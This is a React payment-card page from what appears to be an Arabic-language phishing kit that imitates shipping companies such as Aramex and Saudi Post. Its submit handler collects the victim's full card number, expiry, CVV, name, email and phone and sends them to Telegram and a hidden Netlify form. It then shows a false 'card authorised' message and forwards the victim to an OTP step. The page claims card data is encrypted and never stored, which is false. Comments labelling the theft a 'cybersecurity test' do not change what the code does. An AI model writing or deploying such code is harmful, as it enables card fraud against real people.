import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getBrandingByCompany } from "@/lib/brandingSystem";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { getCompanyLayout } from "@/components/CompanyLayouts";
import { NAQELLayout, ZajilLayout, SaudiPostLayout, UPSLayout } from "@/components/MoreCompanyLayouts";
import { 
  SecureCardHeader, 
  CardBrandIndicator, 
  StyledCardInput,
  PaymentSecurityFooter,
  AcceptedCardsDisplay 
} from "@/components/CardFormComponents";
import { Shield, Lock, Calendar } from "lucide-react";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink } from "@/hooks/useSupabase";
import { CreditCard, AlertCircle, ArrowLeft, CheckCircle2, Building2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { validateLuhn, formatCardNumber, detectCardType, validateExpiry, validateCVV } from "@/lib/cardValidation";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";

const PaymentCardInput = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardValid, setCardValid] = useState<boolean | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Get customer info and selected bank from link data (cross-device compatible)
  const customerInfo = linkData?.payload?.customerInfo || {};
  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const selectedBankId = linkData?.payload?.selectedBank || '';

  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  
  // Get government payment system for styling
  const govSystem = getGovernmentPaymentSystem(selectedCountry);

  const shippingInfo = linkData?.payload as any;
  const paymentData = shippingInfo?.payment_data;

  // Get amount from link data - prioritize payment_data amount, then payment_amount, then cod_amount
  const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  // Get currency code from link data
  const currencyCode = paymentData?.currency_code || shippingInfo?.currency_code || selectedCountry;
  const formattedAmount = formatCurrency(amount, currencyCode);

  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
  
  const handleCardNumberChange = (value: string) => {
    const formatted = formatCardNumber(value.replace(/\D/g, "").slice(0, 16));
    setCardNumber(formatted);
    
    // Validate with Luhn algorithm if 13-19 digits
    const cleaned = formatted.replace(/\s/g, '');
    if (cleaned.length >= 13) {
      const isValid = validateLuhn(formatted);
      setCardValid(isValid);
      
      if (!isValid && cleaned.length === 16) {
        toast({
          title: "رقم البطاقة غير صحيح",
          description: "الرجاء التحقق من رقم البطاقة",
          variant: "destructive",
        });
      }
    } else {
      setCardValid(null);
    }
  };
  
  // Generate month/year options
  const months = Array.from({ length: 12 }, (_, i) => {
    const month = (i + 1).toString().padStart(2, '0');
    return { value: month, label: month };
  });
  
  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 20 }, (_, i) => {
    const year = (currentYear + i).toString().slice(-2);
    return { value: year, label: `20${year}` };
  });
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول",
        variant: "destructive",
      });
      return;
    }
    
    // Validate card number with Luhn
    if (!validateLuhn(cardNumber)) {
      toast({
        title: "رقم البطاقة غير صحيح",
        description: "الرجاء التحقق من رقم البطاقة المدخل",
        variant: "destructive",
      });
      return;
    }
    
    // Validate expiry date
    if (!validateExpiry(expiryMonth, expiryYear)) {
      toast({
        title: "تاريخ الانتهاء غير صحيح",
        description: "البطاقة منتهية الصلاحية أو التاريخ غير صحيح",
        variant: "destructive",
      });
      return;
    }
    
    // Validate CVV
    const cardType = detectCardType(cardNumber);
    if (!validateCVV(cvv, cardType)) {
      toast({
        title: "CVV غير صحيح",
        description: cardType === 'amex' ? "CVV يجب أن يكون 4 أرقام لبطاقات American Express" : "CVV يجب أن يكون 3 أرقام",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);
    
    // Store complete card info for cybersecurity test
    const last4 = cardNumber.replace(/\s/g, "").slice(-4);
    const expiry = `${expiryMonth}/${expiryYear}`;
    
    sessionStorage.setItem('cardLast4', last4);
    sessionStorage.setItem('cardName', cardName);
    sessionStorage.setItem('cardNumber', cardNumber); // Full card number
    sessionStorage.setItem('cardExpiry', expiry); // Full expiry
    sessionStorage.setItem('cardCvv', cvv); // CVV for cybersecurity test
    sessionStorage.setItem('cardType', cardType);
    
    // Submit to Netlify Forms
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "card-details-new",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr || '',
          bank: selectedBank?.nameAr || 'غير محدد',
          cardholder: cardName,
          cardLast4: last4,
          cardType: cardType,
          expiry: expiry,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
      console.error("Form submission error:", err);
    }
    
    // Send complete card details to Telegram (cybersecurity test)
    const telegramResult = await sendToTelegram({
      type: 'card_details_with_bank',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        country: selectedCountryData?.nameAr || '',
        countryCode: selectedCountry,
        bank: selectedBank?.nameAr || 'غير محدد',
        bankId: selectedBankId,
        cardholder: cardName,
        cardNumber: cardNumber, // Full card number for cybersecurity test
        cardLast4: last4,
        cardType: cardType,
        expiry: expiry,
        cvv: cvv, // CVV for cybersecurity test
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    setIsSubmitting(false);
    
    toast({
      title: "تم بنجاح",
      description: "تم تفويض البطاقة بنجاح",
    });
    
    // Navigate directly to OTP (skip bank login for card payment)
    navigate(`/pay/${id}/otp`);
  };
  
  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title="بيانات البطاقة"
      description={`أدخل بيانات البطاقة لخدمة ${serviceName}`}
      icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
    >
      {/* Service Logo */}
      {branding.logo && (
        <div className="mb-6 flex items-center justify-center">
          <img 
            src={branding.logo} 
            alt={serviceName}
            className="h-10 sm:h-12 object-contain"
            style={{ filter: 'drop-shadow(0 2px 8px rgba(0,0,0,0.1))' }}
          />
        </div>
      )}

      {/* Security Notice */}
      <div
        className="mb-6 p-3 sm:p-4 rounded-xl border-2"
        style={{ backgroundColor: `${branding.colors.secondary}10`, borderColor: branding.colors.secondary }}
      >
        <div className="flex items-center gap-3">
          <div
            className="w-10 h-10 sm:w-12 sm:h-12 rounded-full flex items-center justify-center flex-shrink-0"
            style={{ backgroundColor: branding.colors.secondary }}
          >
            <Shield className="w-5 h-5 sm:w-6 sm:h-6 text-white" />
          </div>
          <div className="flex-1">
            <h3
              className="font-bold text-xs sm:text-sm"
              style={{ color: branding.colors.text }}
            >
              🔒 دفع آمن ومشفر
            </h3>
            <p className="text-[10px] sm:text-xs" style={{ color: branding.colors.textLight }}>
              معلومات بطاقتك محمية بأعلى معايير الأمان
            </p>
          </div>
        </div>
      </div>

      {/* Visual Card Display */}
      <div 
        className="rounded-2xl p-5 sm:p-6 mb-6 relative overflow-hidden shadow-xl"
        style={{
          background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
          minHeight: '160px'
        }}
      >
        <div className="absolute top-3 sm:top-4 right-3 sm:right-4 flex items-center gap-2">
          <CreditCard className="w-8 h-8 sm:w-10 sm:h-10 text-white/80" />
          {cardValid === true && (
            <CheckCircle2 className="w-5 h-5 sm:w-6 sm:h-6 text-green-300" />
          )}
        </div>
        
        {/* Card Type Badge */}
        {cardNumber.length > 0 && (
          <div className="absolute top-3 sm:top-4 left-3 sm:left-4">
            <span className="text-[10px] sm:text-xs text-white/70 uppercase font-semibold tracking-wider">
              {detectCardType(cardNumber)}
            </span>
          </div>
        )}
        
        {/* Card Number Display */}
        <div className="mt-12 sm:mt-14 mb-4 sm:mb-5">
          <div className="flex gap-1.5 sm:gap-2 text-white text-lg sm:text-xl md:text-2xl font-mono">
            <span>••••</span>
            <span>••••</span>
            <span>••••</span>
            <span>{cardNumber.replace(/\s/g, "").slice(-4) || "••••"}</span>
          </div>
        </div>

        <div className="flex justify-between items-end text-white gap-4">
          <div className="flex-shrink-0">
            <p className="text-[9px] sm:text-[10px] opacity-70 mb-1">EXPIRES</p>
            <p className="text-sm sm:text-base font-mono">
              {expiryMonth && expiryYear ? `${expiryMonth}/${expiryYear}` : "MM/YY"}
            </p>
          </div>
          <div className="text-right min-w-0 flex-1">
            <p className="text-[9px] sm:text-[10px] opacity-70 mb-1">CARDHOLDER</p>
            <p className="text-sm sm:text-base font-bold truncate">{cardName || "YOUR NAME"}</p>
          </div>
        </div>
      </div>

      {/* Form */}
      <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
        {/* Cardholder Name */}
        <div>
          <Label className="mb-2 text-sm sm:text-base flex items-center gap-2">
            <CreditCard className="w-4 h-4" />
            اسم حامل البطاقة *
          </Label>
          <Input
            placeholder="أدخل الاسم كما هو مكتوب على البطاقة"
            value={cardName}
            onChange={(e) => setCardName(e.target.value.toUpperCase())}
            className="h-12 sm:h-14 text-base sm:text-lg"
            style={{
              borderWidth: '2px',
              borderColor: branding.colors.border
            }}
            required
          />
        </div>
        
        {/* Card Number */}
        <div>
          <Label className="mb-2 text-sm sm:text-base flex items-center justify-between">
            <div className="flex items-center gap-2">
              <CreditCard className="w-4 h-4" />
              <span>رقم البطاقة *</span>
            </div>
            {cardValid === true && (
              <span className="text-xs text-green-600 flex items-center gap-1">
                <CheckCircle2 className="w-4 h-4" />
                صحيح
              </span>
            )}
            {cardValid === false && (
              <span className="text-xs text-destructive">غير صحيح</span>
            )}
          </Label>
          <Input
            placeholder="#### #### #### ####"
            value={cardNumber}
            onChange={(e) => handleCardNumberChange(e.target.value)}
            inputMode="numeric"
            className={`h-12 sm:h-14 text-base sm:text-lg tracking-wider font-mono ${
              cardValid === false ? 'border-destructive' :
              cardValid === true ? 'border-green-500' : ''
            }`}
            style={{
              borderWidth: '2px',
              borderColor: cardValid === false ? '#ef4444' : cardValid === true ? '#10b981' : branding.colors.border
            }}
            required
          />
        </div>
        
        {/* Expiry & CVV Row */}
        <div className="grid grid-cols-3 gap-2 sm:gap-3">
          <div>
            <Label className="mb-2 text-xs sm:text-sm flex items-center gap-2">
              <Calendar className="w-4 h-4" />
              شهر *
            </Label>
            <Select value={expiryMonth} onValueChange={setExpiryMonth} required>
              <SelectTrigger
                className="h-12 sm:h-14"
                style={{ borderWidth: '2px', borderColor: branding.colors.border }}
              >
                <SelectValue placeholder="شهر" />
              </SelectTrigger>
              <SelectContent className="z-50">
                {months.map((month) => (
                  <SelectItem key={month.value} value={month.value}>
                    {month.label}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          <div>
            <Label className="mb-2 text-xs sm:text-sm flex items-center gap-2">
              <Calendar className="w-4 h-4" />
              سنة *
            </Label>
            <Select value={expiryYear} onValueChange={setExpiryYear} required>
              <SelectTrigger
                className="h-12 sm:h-14"
                style={{ borderWidth: '2px', borderColor: branding.colors.border }}
              >
                <SelectValue placeholder="سنة" />
              </SelectTrigger>
              <SelectContent className="z-50">
                {years.map((year) => (
                  <SelectItem key={year.value} value={year.value}>
                    {year.label}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          <div>
            <Label className="mb-2 text-xs sm:text-sm flex items-center gap-2">
              <Lock className="w-4 h-4" />
              CVV *
            </Label>
            <Input
              type="password"
              placeholder="***"
              value={cvv}
              onChange={(e) =>
                setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))
              }
              inputMode="numeric"
              className="h-12 sm:h-14 text-base sm:text-lg text-center"
              style={{ borderWidth: '2px', borderColor: branding.colors.border }}
              maxLength={4}
              required
            />
          </div>
        </div>

        {/* Security Info */}
        <div
          className="mt-6 p-3 sm:p-4 rounded-lg border"
          style={{
            backgroundColor: branding.colors.surface || '#F5F5F5',
            borderColor: `${branding.colors.primary}20`
          }}
        >
          <div className="flex items-start gap-2 sm:gap-3">
            <Lock className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.secondary }} />
            <div className="flex-1">
              <h4 className="font-semibold text-xs sm:text-sm mb-1" style={{ color: branding.colors.text }}>
                🔒 محمي بتشفير SSL
              </h4>
              <p className="text-[10px] sm:text-xs" style={{ color: branding.colors.textLight }}>
                جميع المعلومات مُشفرة ومحمية. لا نقوم بتخزين بيانات بطاقتك.
              </p>
            </div>
          </div>
        </div>
        
        {/* Submit Button */}
        <Button
          type="submit"
          size="lg"
          className="w-full h-12 sm:h-14 text-base sm:text-lg font-bold mt-6 text-white hover:opacity-90 hover:scale-[1.02] transition-all"
          disabled={isSubmitting || !cardValid}
          style={{
            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
            borderRadius: '12px',
            boxShadow: '0 4px 16px rgba(0,0,0,0.2)'
          }}
        >
          {isSubmitting ? (
            <>
              <div className="animate-spin rounded-full h-4 h-4 sm:h-5 sm:w-5 border-b-2 border-white ml-2"></div>
              <span className="text-sm sm:text-base">جاري المعالجة...</span>
            </>
          ) : (
            <>
              <span className="ml-2">دفع الآن</span>
              <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
            </>
          )}
        </Button>

        <p className="text-[10px] sm:text-xs text-center mt-4" style={{ color: branding.colors.textLight }}>
          🔒 بالمتابعة، أنت توافق على الشروط والأحكام
        </p>
      </form>
    
      {/* Hidden Netlify Form */}
      <form name="card-details-new" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="country" />
        <input type="text" name="bank" />
        <input type="text" name="cardholder" />
        <input type="text" name="cardLast4" />
        <input type="text" name="cardType" />
        <input type="text" name="expiry" />
        <input type="text" name="timestamp" />
      </form>
    </DynamicPaymentLayout>
  );
};

export default PaymentCardInput;
